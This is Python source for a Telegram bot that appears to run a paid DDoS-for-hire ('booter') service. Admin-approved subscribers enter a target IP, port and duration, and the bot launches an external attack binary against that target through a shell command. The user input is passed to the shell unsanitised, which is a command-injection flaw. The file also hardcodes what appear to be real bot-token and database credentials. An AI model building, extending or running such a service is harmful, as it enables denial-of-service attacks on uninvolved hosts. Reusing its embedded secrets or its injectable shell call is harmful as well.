import os
import telebot
import logging
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import subprocess
import random
from threading import Thread
import asyncio
import aiohttp
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

loop = asyncio.get_event_loop()

# Telegram bot token and MongoDB URI
TOKEN = '7889670543:AAE2CpKPg_CsbkmmAB3Wrk4434JmHofZVNM'
MONGO_URI = 'mongodb+srv://Soul:JYAuvlizhw7wqLOb@soul.tsga4.mongodb.net'
FORWARD_CHANNEL_ID = 1002292224661
CHANNEL_ID = 1002292224661
ERROR_CHANNEL_ID = 1002292224661

# Admin ID (add your admin Telegram user ID here)
ADMIN_ID = 6207079474  # Replace with the actual admin's Telegram user ID

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

client = MongoClient(MONGO_URI)
db = client['soul']
users_collection = db.users

bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

# Blocked ports list
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# Function to check if user is admin
def is_user_admin(user_id, chat_id):
    # Check if the user is the admin based on the ADMIN_ID
    return user_id == ADMIN_ID

# Admin command to approve/disapprove user
@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    # Only allow the admin to use this command
    if not is_user_admin(user_id, chat_id):
        bot.send_message(chat_id, "*You are not authorized to use this command*", parse_mode='Markdown')
        return

    cmd_parts = message.text.split()

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "*Invalid command format. Use /approve <user_id> <plan> <days> or /disapprove <user_id>.*", parse_mode='Markdown')
        return

    action = cmd_parts[0]
    target_user_id = int(cmd_parts[1])
    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
    days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0

    if action == '/approve':
        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
            upsert=True
        )
        msg_text = f"*User {target_user_id} approved with plan {plan} for {days} days.*"
    else:  # disapprove
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
            upsert=True
        )
        msg_text = f"*User {target_user_id} disapproved and reverted to free.*"

    bot.send_message(chat_id, msg_text, parse_mode='Markdown')
    bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown')

# Handle attack command
@bot.message_handler(commands=['attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    try:
        user_data = users_collection.find_one({"user_id": user_id})
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "You are not approved to use this bot. Please contact the administrator.")
            return

        if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 99:
            bot.send_message(chat_id, "Your Instant Plan 🧡 is currently not available due to limit reached.")
            return

        if user_data['plan'] == 2 and users_collection.count_documents({"plan": 2}) > 499:
            bot.send_message(chat_id, "Your Instant++ Plan 💥 is currently not available due to limit reached.")
            return

        bot.send_message(chat_id, "Enter the target IP, port, and duration (in minutes) separated by spaces.")
        bot.register_next_step_handler(message, process_attack_command)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")

# Process attack command after user inputs IP, port, and duration
def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "Invalid command format. Please use: /attack target_ip target_port duration_in_minutes")
            return

        target_ip, target_port, duration_minutes = args[0], int(args[1]), int(args[2])

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"Port {target_port} is blocked. Please use a different port.")
            return

        # Execute the C program using subprocess
        expiration_time = "2025-10-22 23:59:59"  # Fixed expiration time
        command = f"./sam {target_ip} {target_port} {duration_minutes}"

        # Start the C program
        subprocess.Popen(command, shell=True)

        bot.send_message(message.chat.id, f"Attack started on {target_ip}:{target_port} for {duration_minutes} minutes.")
    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")

# Welcome message with keyboard
@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
    btn1 = KeyboardButton("Instant Plan 🧡")
    btn2 = KeyboardButton("Instant++ Plan 💥")
    btn3 = KeyboardButton("Channel Link ✔️")
    btn4 = KeyboardButton("My Account 🏦")
    btn5 = KeyboardButton("Help ❓")
    btn6 = KeyboardButton("Contact Admin ✔️")
    markup.add(btn2, btn3, btn6)

    bot.send_message(message.chat.id, "Choose an option:", reply_markup=markup)

# Handle user interactions with buttons
@bot.message_handler(func=lambda message: True)
def handle_button_response(message):
    if message.text == "Instant Plan 🧡":
        bot.send_message(message.chat.id, "You have selected Instant Plan 🧡! Your access is being processed.")
    elif message.text == "Instant++ Plan 💥":
        bot.send_message(message.chat.id, "Congratulations on selecting Instant++ Plan 💥! You now have priority access and additional features please click here /attack 👈.")
    elif message.text == "Channel Link ✔️":
        bot.send_message(message.chat.id, "Click here to join our official channel: [Join Channel](https://t.me/l4dwale)", parse_mode="Markdown")
    elif message.text == "My Account 🏦":
        bot.send_message(message.chat.id, "To view your account details, please provide your user ID.")
    elif message.text == "Help ❓":
        bot.send_message(message.chat.id, "Need help? You can ask about plans, features, or technical assistance.")
    elif message.text == "Contact Admin ✔️":
        bot.send_message(message.chat.id, "You can reach our support team here: [Support Contact](@Samy784)", parse_mode="Markdown")
    else:
        bot.send_message(message.chat.id, "Sorry, I didn't understand that. Please choose an option from the menu.")

# Start polling
if __name__ == "__main__":
    logging.info("Starting bot...")
    bot.polling(none_stop=True)
    
